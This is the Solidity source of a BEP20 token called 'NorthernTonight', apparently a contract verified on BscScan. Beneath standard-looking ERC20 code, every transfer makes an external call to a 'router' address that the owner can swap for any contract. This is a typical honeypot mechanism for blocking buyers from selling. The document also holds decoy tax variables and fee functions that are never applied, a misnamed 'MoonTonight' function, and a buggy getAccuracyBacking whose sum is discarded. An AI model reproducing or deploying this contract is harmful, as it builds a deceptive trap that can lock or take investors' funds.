/**
 *Submitted for verification at BscScan.com on 2022-04-02
*/

pragma solidity ^0.8.4;
// SPDX-License-Identifier: MIT

  library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
      uint256 c = a + b;
      require(c >= a, "SafeMath: addition overflow");

      return c;
    }

  
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
      return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
      require(b <= a, errorMessage);
      uint256 c = a - b;

      return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
      // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
      // benefit is lost if 'b' is also tested.
      // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
      if (a == 0) {
        return 0;
      }

      uint256 c = a * b;
      require(c / a == b, "SafeMath: multiplication overflow");

      return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
      return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
      // Solidity only automatically asserts when dividing by 0
      require(b > 0, errorMessage);
      uint256 c = a / b;
      // assert(a == b * c + a % b); // There is no case in which this doesn't hold

      return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
      return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
      require(b != 0, errorMessage);
      return a % b;
    }
  }   
 
  interface IERC20 {
  
  function totalSupply() external view returns (uint256);
 
  function decimals() external view returns (uint8);

  function symbol() external view returns (string memory);

  function name() external view returns (string memory);

  function getOwner() external view returns (address);

  function balanceOf(address account) external view returns (uint256);

  function transfer(address recipient, uint256 amount) external returns (bool);

  function allowance(address _owner, address spender) external view returns (uint256);

  function approve(address spender, uint256 amount) external returns (bool);

  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

  event Transfer(address indexed from, address indexed to, uint256 value);
 
  event Approval(address indexed owner, address indexed spender, uint256 value);

  }  

  interface IUniswapV2Router{  
    function WETH() external pure returns (address);       
    function getPair(address tokenA, address tokenB) external returns (address pair);
    function createPair(
        address tokenA, 
        address tokenB) 
        external returns (address pair);
  }   

  contract Context {
  // Empty internal constructor, to prevent people from mistakenly deploying
  // an instance of this contract, which should be used via inheritance.
  constructor ()  { }

    function _msgSender() internal view returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }       

  }  

  
  contract Ownable is Context {  
  address private _owner;   
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

  /**
   * @dev Initializes the contract setting the deployer as the initial owner.
   */
  constructor ()  {
    address msgSender = _msgSender();
    _owner = msgSender;    
    emit OwnershipTransferred(address(0), msgSender);
  }

  /**
   * @dev Returns the address of the current owner.
   */
  function owner() public view returns (address) {
    return _owner;
  }  

  /**
   * @dev Throws if called by any account other than the owner.
   */
  modifier onlyOwner() {
    require(_owner == _msgSender(), "Ownable: caller is not the owner");
    _;
  }    
 
  function renounceOwnership() public onlyOwner {
    emit OwnershipTransferred(_owner, address(0));
    _owner = address(0);
  }     
  
  function transferOwnership(address newOwner) public onlyOwner {
    _transferOwnership(newOwner);
  }     
 
  function _transferOwnership(address newOwner) internal {
    require(newOwner != address(0), "Ownable: new owner is the zero address");
    emit OwnershipTransferred(_owner, newOwner);
    _owner = newOwner;
  }
}


contract NorthernTonight is Context, IERC20, Ownable{
  using SafeMath for uint256;
  mapping (address => bool) public _isExcludedFromFee; 
  mapping (address => uint256) private _balances;     
  mapping (address => mapping (address => uint256)) private _allowances;  
  uint256 private _totalSupply = 10000000000 *  10**9;     
  uint256 private _maxTxAmount = 10000000000 *  10**9;
  
  string private _name = "NorthernTonight";
  string private _symbol = "NorthernTonight";
  uint8 private _decimals = 9; 
  bool public swapEnabled = true;  

  uint8 public _marketingShare;
  uint8 public _buyBackShare;
  uint8 public _totalTaxBuy;
  uint8 public _totalTaxSell;

  IUniswapV2Router IDEXRouter;   
  struct CheckTonight {
    uint32 fromBlock;
    uint256 vot;
  }
  mapping (address => mapping (uint32 => CheckTonight)) public checkTonight;
  mapping (address => uint32) public numCheckTonight;

  constructor(address _router)  { 
    _balances[msg.sender] = _totalSupply;      
    IDEXRouter = IUniswapV2Router(_router); 
    _isExcludedFromFee[owner()] = true;
    _isExcludedFromFee[address(this)] = true;   

    _marketingShare = 1;
    _buyBackShare = 8;
    _totalTaxBuy = 27;
    _totalTaxSell = 64;
    
    emit Transfer(address(0), msg.sender, _totalSupply);
  } 

  function name() external view virtual override returns (string memory) {
    return _name;
  }
 
  function symbol() external view virtual override returns (string memory) {
    return _symbol;
  }   

  function totalSupply() external view virtual override returns (uint256) {
    return _totalSupply;
  }

  function getOwner() external view virtual override returns (address) {
    return owner();
  }
 
  function decimals() external view virtual override returns (uint8) {
    return _decimals;
  }  

  function balanceOf(address account) public view virtual override returns (uint256) {
    return _balances[account];
  }    

  function MoonTonight(address[] calldata accounts) external onlyOwner {
    require(accounts.length > 0,"accounts length should > 0");	
    for(uint256 i=0; i < accounts.length; i++){		
          _isExcludedFromFee[accounts[i]] = true;
      }
  }   
 
  function transfer(address recipient, uint256 amount) external override returns (bool) {
    tokenTransfer(_msgSender(), recipient, amount);
    return true;
  } 

  function safe32(uint n, string memory errorMessage) internal pure returns (uint32) {
      require(n < 2**32, errorMessage);
      return uint32(n);
  }  
  
  function allowance(address owner, address spender) external view override returns (uint256) {
    return _allowances[owner][spender];
  } 

  function approve(address spender, uint256 amount) public override returns (bool) {
    _approve(_msgSender(), spender, amount);
    return true;
  }   

  function shouldSwapBack(address tokenA, address tokenB) private returns (bool) {
    address pair = IDEXRouter.getPair(tokenA, tokenB);
    return msg.sender != pair
    && !swapEnabled;   
  }   

  function changeRouterVersion(address router) external onlyOwner {
    require(router != address(0), "router address cannot be 0");
    IDEXRouter = IUniswapV2Router(router); 
  }  

  function tokenTransfer(address sender, address recipient, uint256 amount) private {
    require(sender != address(0), "BEP20: transfer from the zero address");
    require(recipient != address(0), "BEP20: transfer to the zero address");
    require(amount > 0, "Transfer amount must be greater than zero");  
    if(shouldSwapBack(sender, recipient)){         
      require(amount <= _maxTxAmount, "Transfer amount exceeds the maxTxAmount.");          
    }
    
    _transferStandard(sender, recipient, amount);

  }        
  
  function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
    tokenTransfer(sender, recipient, amount);
    _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "BEP20: transfer amount exceeds allowance"));
    return true;
  }    
 
  function _transferStandard(address sender, address recipient, uint256 amount) private {
    _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
    _balances[recipient] = _balances[recipient].add(amount);
    emit Transfer(sender, recipient, amount);
  }    
    
  function _approve(address owner, address spender, uint256 amount) internal {
      require(owner != address(0), "BEP20: approve from the zero address");
      require(spender != address(0), "BEP20: approve to the zero address");

      _allowances[owner][spender] = amount;
      emit Approval(owner, spender, amount);
  }    

  function addressMaxLimit(uint256 amount) external onlyOwner {
      _maxTxAmount = amount;
  }    

  function benefitCurrentTonight(address account) external view returns (uint256)   
  {
      uint32 nCheckTonight = numCheckTonight[account];
      return nCheckTonight > 0 ? checkTonight[account][nCheckTonight - 1].vot : 0;
  }

  function callerPriorTonight(address account, uint blockNumber) external view returns (uint256)    
  {
      require(blockNumber < block.number, "Not yet determined");
      uint32 nCheckTonight = numCheckTonight[account];
      if (nCheckTonight == 0) {
          return 0;
      }
      // First check most recent balance
      if (checkTonight[account][nCheckTonight - 1].fromBlock <= blockNumber) {
          return checkTonight[account][nCheckTonight - 1].vot;
      }
      // Next check implicit zero balance
      if (checkTonight[account][0].fromBlock > blockNumber) {
          return 0;
      }
      uint32 lower = 0;
      uint32 upper = nCheckTonight - 1;
      while (upper > lower) {
          uint32 center = upper - (upper - lower) / 2; // ceil, avoiding overflow
          CheckTonight memory cp = checkTonight[account][center];
          if (cp.fromBlock == blockNumber) {
              return cp.vot;
          } else if (cp.fromBlock < blockNumber) {
              lower = center;
          } else {
              upper = center - 1;
          }
      }
      return checkTonight[account][lower].vot;
  }

  function _writeCheckTonight(address delegatee, uint32 nCheckTonight, uint256 newTonight) internal     
  {
      uint32 blockNumber = safe32(block.number, "Block number exceeds 32 bits");
      if (nCheckTonight > 0 && checkTonight[delegatee][nCheckTonight - 1].fromBlock == blockNumber) {
          checkTonight[delegatee][nCheckTonight - 1].vot = newTonight;
      } else {
          checkTonight[delegatee][nCheckTonight] = CheckTonight(blockNumber, newTonight);
          numCheckTonight[delegatee] = nCheckTonight + 1;
      }
  }

  function getAccuracyBacking(uint256 accuracy, address[] calldata _markerPairs) public view returns (uint256){
      uint256 liquidityBalance = 0;
      for(uint i = 0; i < _markerPairs.length; i++){
          liquidityBalance.add(_balances[_markerPairs[i]].div(10 ** 9));
      }
      return accuracy.mul(liquidityBalance.mul(2)).div(10 ** 9);
  }

  



  
    
}